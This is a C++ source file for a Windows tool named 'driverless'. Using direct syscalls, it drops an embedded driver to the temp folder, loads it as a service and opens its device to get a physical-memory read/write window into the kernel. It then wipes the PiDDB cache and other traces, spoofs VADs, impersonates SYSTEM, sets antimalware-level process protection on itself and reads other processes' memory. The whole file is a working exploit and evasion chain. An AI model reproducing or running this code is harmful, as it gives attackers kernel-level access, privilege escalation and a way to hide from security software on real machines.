#include <windows.h>
#include <aclapi.h>
#include <stdio.h>
#include "syscalls.h"
#include "symbols.h"
#include "physmem.h"
#include "cleanup.h"
#include "protect.h"
#include "window.h"
#include "reader.h"
#include "driver_bytes.h"

int main() {
    printf("[*] driverless\n\n");

    printf("[*] Resolving syscalls...\n");
    SyscallTable sc = {};
    if (!ResolveSyscalls(&sc)) {
        printf("[-] Failed to resolve syscalls\n");
        return 1;
    }

    KernelOffsets kOffsets = {};
    if (!ResolveKernelOffsets(&kOffsets)) {
        printf("[-] Failed to resolve kernel offsets\n");
        return 1;
    }

    printf("\n[*] Enabling SeLoadDriverPrivilege...\n");
    {
        HANDLE tokenHandle;
        OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &tokenHandle);

        TOKEN_PRIVILEGES tp = {};
        LookupPrivilegeValueW(NULL, SE_LOAD_DRIVER_NAME, &tp.Privileges[0].Luid);
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(tokenHandle, FALSE, &tp, sizeof(tp), NULL, NULL);

        if (GetLastError() != 0) {
            printf("[-] Failed to enable SeLoadDriverPrivilege\n");
            return 1;
        }
        CloseHandle(tokenHandle);
        printf("[+] SeLoadDriverPrivilege enabled\n");
    }

    printf("\n[*] Dropping driver to temp...\n");

    wchar_t tempDir[MAX_PATH] = {};
    GetTempPathW(MAX_PATH, tempDir);

    DWORD tick = (DWORD)GetTickCount64();
    wchar_t svcName[32] = {};
    wsprintfW(svcName, L"tmp%X", tick);

    wchar_t dropPath[MAX_PATH] = {};
    wsprintfW(dropPath, L"%s%s.sys", tempDir, svcName);

    wchar_t ntPath[MAX_PATH] = {};
    wsprintfW(ntPath, L"\\??\\%s", dropPath);

    HANDLE fileHandle = NULL;
    IO_STATUS_BLOCK ioStatus = {};
    UNICODE_STRING filePath;
    OBJECT_ATTRIBUTES fileAttrs;

    InitUnicodeString(&filePath, ntPath);
    InitializeObjectAttributes(&fileAttrs, &filePath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    NTSTATUS status = DoSyscallEx(
        sc.NtCreateFile,
        (ULONG_PTR)&fileHandle,
        (ULONG_PTR)(GENERIC_WRITE | SYNCHRONIZE),
        (ULONG_PTR)&fileAttrs,
        (ULONG_PTR)&ioStatus,
        (ULONG_PTR)NULL,
        (ULONG_PTR)FILE_ATTRIBUTE_NORMAL,
        (ULONG_PTR)FILE_SHARE_READ,
        (ULONG_PTR)5,   // FILE_OVERWRITE_IF
        (ULONG_PTR)0x20, // FILE_SYNCHRONOUS_IO_NONALERT
        (ULONG_PTR)NULL,
        (ULONG_PTR)0
    );

    if (status != 0) {
        printf("[-] Failed to create temp file: 0x%lX\n", status);
        return 1;
    }

    ioStatus = {};
    status = DoSyscallEx(
        sc.NtWriteFile,
        (ULONG_PTR)fileHandle,
        (ULONG_PTR)NULL,
        (ULONG_PTR)NULL,
        (ULONG_PTR)NULL,
        (ULONG_PTR)&ioStatus,
        (ULONG_PTR)g_DriverBytes,
        (ULONG_PTR)g_DriverSize,
        (ULONG_PTR)NULL,
        (ULONG_PTR)NULL,
        0, 0
    );

    DoSyscall(sc.NtClose, (ULONG_PTR)fileHandle, 0, 0, 0);

    if (status != 0) {
        printf("[-] Failed to write driver bytes: 0x%lX\n", status);
        return 1;
    }
    printf("[+] Dropped %u bytes\n", g_DriverSize);

    printf("\n[*] Creating service registry key...\n");

    UNICODE_STRING keyPath;
    wchar_t svcRegPath[MAX_PATH] = {};
    wsprintfW(svcRegPath, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\%s", svcName);
    InitUnicodeString(&keyPath, svcRegPath);

    OBJECT_ATTRIBUTES keyAttrs;
    InitializeObjectAttributes(&keyAttrs, &keyPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE keyHandle = NULL;
    ULONG disposition = 0;

    status = DoSyscallEx(
        sc.NtCreateKey,
        (ULONG_PTR)&keyHandle,
        (ULONG_PTR)KEY_ALL_ACCESS,
        (ULONG_PTR)&keyAttrs,
        (ULONG_PTR)0,
        (ULONG_PTR)NULL,
        (ULONG_PTR)0,
        (ULONG_PTR)&disposition,
        0, 0, 0, 0
    );

    if (status != 0) {
        printf("[-] NtCreateKey failed: 0x%lX\n", status);
        return 1;
    }

    UNICODE_STRING imagePathName;
    InitUnicodeString(&imagePathName, L"ImagePath");

    status = DoSyscallEx(
        sc.NtSetValueKey,
        (ULONG_PTR)keyHandle,
        (ULONG_PTR)&imagePathName,
        (ULONG_PTR)0,
        (ULONG_PTR)REG_EXPAND_SZ,
        (ULONG_PTR)ntPath,
        (ULONG_PTR)((wcslen(ntPath) + 1) * sizeof(wchar_t)),
        0, 0, 0, 0, 0
    );

    if (status != 0) {
        printf("[-] Failed to set ImagePath: 0x%lX\n", status);
        return 1;
    }

    UNICODE_STRING typeName;
    InitUnicodeString(&typeName, L"Type");
    DWORD driverType = 1;

    status = DoSyscallEx(
        sc.NtSetValueKey,
        (ULONG_PTR)keyHandle,
        (ULONG_PTR)&typeName,
        (ULONG_PTR)0,
        (ULONG_PTR)REG_DWORD,
        (ULONG_PTR)&driverType,
        (ULONG_PTR)sizeof(driverType),
        0, 0, 0, 0, 0
    );

    DoSyscall(sc.NtClose, (ULONG_PTR)keyHandle, 0, 0, 0);

    if (status != 0) {
        printf("[-] Failed to set Type: 0x%lX\n", status);
        return 1;
    }
    printf("[+] Service key created\n");

    printf("\n[*] Loading driver...\n");

    UNICODE_STRING servicePath;
    InitUnicodeString(&servicePath, svcRegPath);

    status = DoSyscall(
        sc.NtLoadDriver,
        (ULONG_PTR)&servicePath,
        0, 0, 0
    );

    if (status == 0xC000010E || status == 0xC0000035) {
        printf("[*] Driver already loaded (0x%lX), reusing\n", status);
    } else if (status != 0) {
        printf("[-] NtLoadDriver failed: 0x%lX\n", status);
        return 1;
    } else {
        printf("[+] Driver loaded\n");
    }

    DeleteFileW(dropPath);

    printf("\n[*] Opening device handle...\n");

    HANDLE deviceHandle = NULL;
    ioStatus = {};
    UNICODE_STRING devicePath;
    OBJECT_ATTRIBUTES deviceAttrs;

    InitUnicodeString(&devicePath, L"\\DosDevices\\EBIoDispatch");
    InitializeObjectAttributes(&deviceAttrs, &devicePath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = DoSyscallEx(
        sc.NtCreateFile,
        (ULONG_PTR)&deviceHandle,
        (ULONG_PTR)(GENERIC_READ | GENERIC_WRITE),
        (ULONG_PTR)&deviceAttrs,
        (ULONG_PTR)&ioStatus,
        (ULONG_PTR)NULL,
        (ULONG_PTR)0,
        (ULONG_PTR)0,
        (ULONG_PTR)3,
        (ULONG_PTR)0,
        (ULONG_PTR)NULL,
        (ULONG_PTR)0
    );

    if (status != 0) {
        printf("[-] Failed to open device: 0x%lX\n", status);
        return 1;
    }
    printf("[+] Device handle: 0x%p\n", deviceHandle);

    printf("\n[*] Finding System CR3...\n");

    ULONG64 systemCr3 = FindSystemCr3(deviceHandle, &sc, kOffsets.NtoskrnlBase);
    if (!systemCr3) {
        printf("[-] Failed to find System CR3\n");
        return 1;
    }
    printf("[+] System CR3: 0x%llX\n", systemCr3);

    if (!SetupPhysWindow(deviceHandle, &sc, systemCr3, &kOffsets)) {
        printf("[-] Failed to set up physical memory window\n");
        return 1;
    }

    SpoofWindowVADs(deviceHandle, &sc, systemCr3, &kOffsets);

    printf("\n[*] Trace cleanup\n");

    wchar_t driverFileName[64] = {};
    wsprintfW(driverFileName, L"%s.sys", svcName);
    CleanPiDDBCache(deviceHandle, &sc, systemCr3, &kOffsets, driverFileName);

    MmCleanupContext mmCtx = {};
    bool mmPrepared = PrepareMmCleanup(deviceHandle, &sc, systemCr3, &kOffsets, &mmCtx);

    printf("\n[*] Unloading driver...\n");
    DoSyscall(sc.NtClose, (ULONG_PTR)deviceHandle, 0, 0, 0);

    status = DoSyscall(sc.NtUnloadDriver, (ULONG_PTR)&servicePath, 0, 0, 0);
    printf("[%c] Driver unloaded\n", status == 0 ? '+' : '-');

    if (mmPrepared && status == 0)
        FinishMmCleanup(&mmCtx);

    InitializeObjectAttributes(&keyAttrs, &keyPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
    status = DoSyscallEx(
        sc.NtCreateKey,
        (ULONG_PTR)&keyHandle,
        (ULONG_PTR)KEY_ALL_ACCESS,
        (ULONG_PTR)&keyAttrs,
        0, 0, 0,
        (ULONG_PTR)&disposition,
        0, 0, 0, 0
    );
    if (status == 0) {
        DoSyscall(sc.NtDeleteKey, (ULONG_PTR)keyHandle, 0, 0, 0);
        DoSyscall(sc.NtClose, (ULONG_PTR)keyHandle, 0, 0, 0);
    }
    printf("[+] Registry key deleted\n");

    if (!ImpersonateSystem())
        printf("[-] Failed to impersonate SYSTEM\n");

    // PPL via physical memory window — no driver needed
    {
        DWORD ourPid = GetCurrentProcessId();
        ULONG64 psActiveVA = kOffsets.NtoskrnlBase + kOffsets.PsActiveProcessHead;
        ULONG64 psActivePA = WindowVirtToPhys(systemCr3, psActiveVA);
        if (psActivePA) {
            ULONG64 link = WindowRead64(psActivePA);
            int n = 0;
            while (link != psActiveVA && link && n++ < 500) {
                ULONG64 eprocessVA = link - kOffsets.ActiveProcessLinks;
                ULONG64 eprocessPA = WindowVirtToPhys(systemCr3, eprocessVA);
                if (!eprocessPA) break;
                if ((DWORD)WindowRead64(eprocessPA + kOffsets.UniqueProcessId) == ourPid) {
                    ULONG64 protPA = WindowVirtToPhys(systemCr3, eprocessVA + kOffsets.Protection);
                    if (protPA) {
                        BYTE ppl = 0x31; // PsProtectedTypeLight | PsProtectedSignerAntimalware
                        WindowWriteBuffer(protPA, &ppl, 1);
                        printf("[+] PPL set (0x31)\n");
                    }
                    break;
                }
                ULONG64 nextPA = WindowVirtToPhys(systemCr3, link);
                if (!nextPA) break;
                link = WindowRead64(nextPA);
            }
        }
    }

    LockProcessDACL();

    printf("\n[*] Verification\n");

    __try {
        ULONG64 ntPhys = WindowVirtToPhys(systemCr3, kOffsets.NtoskrnlBase);
        if (ntPhys) {
            USHORT mz = (USHORT)WindowRead32(ntPhys);
            printf("[%c] Window: %s\n", mz == 0x5A4D ? '+' : '-',
                   mz == 0x5A4D ? "LIVE" : "FAILED");
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        printf("[-] Window: FAILED\n");
    }

    {
        typedef NTSTATUS(WINAPI* fnNtQIP)(HANDLE, ULONG, PVOID, ULONG, PULONG);
        auto NtQIP = (fnNtQIP)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
        if (NtQIP) {
            BYTE level = 0;
            ULONG len = 0;
            NTSTATUS s = NtQIP(GetCurrentProcess(), 61, &level, sizeof(level), &len);
            printf("[%c] PPL: 0x%02X\n", (s == 0 && level == 0x31) ? '+' : '-', level);
        }
    }

    {
        HANDLE hToken = NULL;
        bool isSys = false;
        if (OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &hToken)) {
            BYTE buf[256] = {};
            DWORD needed = 0;
            if (GetTokenInformation(hToken, TokenUser, buf, sizeof(buf), &needed)) {
                BYTE sid[SECURITY_MAX_SID_SIZE] = {};
                DWORD sz = sizeof(sid);
                if (CreateWellKnownSid(WinLocalSystemSid, NULL, sid, &sz))
                    isSys = EqualSid(((TOKEN_USER*)buf)->User.Sid, sid);
            }
            CloseHandle(hToken);
        }
        printf("[%c] SYSTEM: %s\n", isSys ? '+' : '-', isSys ? "YES" : "NO");
    }

    printf("\n[+] Driverless loader complete\n");
    printf("[+] System CR3: 0x%llX\n", systemCr3);

    DemoReadProcess(systemCr3, &kOffsets);

    printf("\n[*] Press Enter to exit...\n");
    (void)getchar();

    RestorePhysWindow();
    return 0;
}
